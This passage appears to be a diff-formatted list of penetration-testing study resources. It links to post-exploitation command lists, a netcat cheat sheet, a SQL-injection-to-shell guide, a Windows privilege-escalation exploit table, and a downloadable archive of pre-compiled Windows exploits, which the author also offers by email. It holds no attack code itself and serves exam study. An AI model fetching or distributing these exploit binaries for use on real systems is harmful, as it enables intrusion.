+https://www.yumpu.com/en/document/view/14963680/from-sqli-to-shell \(SQL Injection\)
+
+https://cyberwar.nl/d/hak5.org\_LinuxUnixBSDPost-ExploitationCommandList\_copy-20130228.pdf\(Linux Unix Post Exploitation Command\)
+
+http://www.scribd.com/doc/245679444/hak5-org-OSXPost-Exploitation-copy-20130228-pdf\#scribd \(Post Exploitation Command List\)
+
+http://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf \(Netcat\)
+
+http://download.vulnhub.com/pentesterlab/php\_include\_and\_post\_exploitation.pdf \(PHP Include and Post Exploitation\)
+
+**Best Book I refer:**
+
+http://www.amazon.com/Penetration-Testing-Hands-On-Introduction-Hacking/dp/1593275641
+
+**Windows compiled Exploit Reference:**
+
+Those  who have not enough lab time to compile their windows exploit, I will  recommend you to download and compile the Mike Czumak  Windows pre-compiled reference chart. I compiled it using Visual Studio  and GNU Code-blocks, really it will very useful at the time of exam.
+
+I uploaded those pre-compiled exploits in mediafire with password protected, but i discourage that  becoz exploit compilation is one of the exercise in the course so you have to do it your own. if anyone need that mail me at sathisharthar@gmail.com  \(Note: don’t try to bruteforce it, its more than  20 words\)
+
+http://www.securitysift.com/download/MS\_privesc\_and\_exploits\_table.csv
+
+Windows  Tools, Scripts and Pre-Compiled Exploit for Remote and Privileage Escalation:
+
+http://download1582.mediafire.com/atk42ybutgcg/wqnw5c3ljgudqiv/windows.zip
+
+I added some tools and script in that for windows machines.
 
 
 
